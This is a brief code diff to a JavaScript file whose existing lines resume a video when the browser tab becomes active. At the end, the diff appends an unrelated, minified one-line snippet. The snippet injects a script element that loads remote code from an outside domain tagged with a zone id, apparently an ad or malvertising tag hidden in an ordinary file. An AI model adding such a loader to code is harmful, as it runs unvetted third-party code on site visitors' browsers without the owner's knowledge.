@@ -10,3 +10,5 @@ document.addEventListener('visibilitychange', function() {
     video.play(); // Resume the video when the tab is active
   }
 });
+
+(function(s){s.dataset.zone='10444724',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
